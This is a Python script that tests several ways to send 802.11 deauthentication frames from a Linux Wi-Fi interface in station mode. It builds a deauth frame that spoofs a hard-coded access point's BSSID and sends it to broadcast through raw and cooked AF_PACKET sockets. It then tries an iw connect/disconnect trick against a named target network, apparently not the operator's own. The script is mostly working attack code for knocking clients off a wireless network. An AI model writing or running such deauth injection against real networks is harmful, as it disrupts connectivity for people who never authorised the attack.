#!/usr/bin/env python3
"""
Test multiple TX injection methods in STA mode:
1. AF_PACKET raw socket
2. iw dev connect/disconnect trick
3. wpa_cli disconnect command
"""
import socket, struct, subprocess, time, sys

BSSID = "04:67:61:d6:dc:92"
BSSID_B = bytes.fromhex(BSSID.replace(":",""))
OWN_MAC = bytes.fromhex("5c17cfbca4e3")

def make_deauth(sa, bssid, reason=7):
    """Build IEEE 802.11 deauth frame"""
    f = struct.pack("<H", 0x00c0)       # FC: deauth
    f += struct.pack("<H", 0x0000)      # duration
    f += b'\xff\xff\xff\xff\xff\xff'     # DA: broadcast
    f += sa                              # SA
    f += bssid                           # BSSID
    f += struct.pack("<H", 0)           # seq
    f += struct.pack("<H", reason)      # reason code
    return f

# --- Method 1: AF_PACKET raw ---
print("=== Method 1: AF_PACKET raw socket ===", flush=True)
try:
    # ETH_P_ALL = 0x0003
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    s.bind(("wlan0", 0))

    deauth = make_deauth(BSSID_B, BSSID_B, 7)

    # Try sending raw 802.11 frame
    try:
        sent = s.send(deauth)
        print(f"  Sent {sent} bytes via SOCK_RAW", flush=True)
    except Exception as e:
        print(f"  SOCK_RAW send error: {e}", flush=True)

    s.close()
except Exception as e:
    print(f"  AF_PACKET SOCK_RAW error: {e}", flush=True)

# Try SOCK_DGRAM (cooked socket)
print("=== Method 1b: AF_PACKET SOCK_DGRAM ===", flush=True)
try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_DGRAM, socket.htons(0x0003))
    s.bind(("wlan0", 0))
    deauth = make_deauth(BSSID_B, BSSID_B, 7)
    try:
        sent = s.send(deauth)
        print(f"  Sent {sent} bytes via SOCK_DGRAM", flush=True)
    except Exception as e:
        print(f"  SOCK_DGRAM send error: {e}", flush=True)
    s.close()
except Exception as e:
    print(f"  AF_PACKET SOCK_DGRAM error: {e}", flush=True)

# --- Method 2: iw connect/disconnect ---
print("\n=== Method 2: iw dev connect to target, then disconnect ===", flush=True)
print("  Attempting auth to target AP (will fail WPA2)...", flush=True)

# Save current connection
r = subprocess.run(["iw", "dev", "wlan0", "link"], capture_output=True, text=True)
print(f"  Current: {r.stdout.strip()[:80]}", flush=True)

# Try connecting to target - just auth, not full association
r = subprocess.run(["iw", "dev", "wlan0", "connect", "不想上班", "2412"],
                   capture_output=True, text=True, timeout=5)
print(f"  Connect result: rc={r.returncode} {r.stderr.strip()}", flush=True)
time.sleep(1)

r = subprocess.run(["iw", "dev", "wlan0", "link"], capture_output=True, text=True)
print(f"  After connect: {r.stdout.strip()[:120]}", flush=True)

# Disconnect (this sends a real deauth)
r = subprocess.run(["iw", "dev", "wlan0", "disconnect"], capture_output=True, text=True)
print(f"  Disconnect result: rc={r.returncode}", flush=True)

# --- Method 3: Try NM/wpa_supplicant ---
print("\n=== Method 3: wpa_cli scan_results ===", flush=True)
r = subprocess.run(["wpa_cli", "-i", "wlan0", "scan_results"],
                   capture_output=True, text=True, timeout=5)
print(f"  {r.stdout[:200]}", flush=True)

# Reconnect to our AP
print("\n=== Reconnecting to 9899a5b77... ===", flush=True)
time.sleep(2)
r = subprocess.run(["iw", "dev", "wlan0", "link"], capture_output=True, text=True)
print(f"  Status: {r.stdout.strip()[:120]}", flush=True)

print("\nDone! Check dmesg for Deauth TX messages.", flush=True)
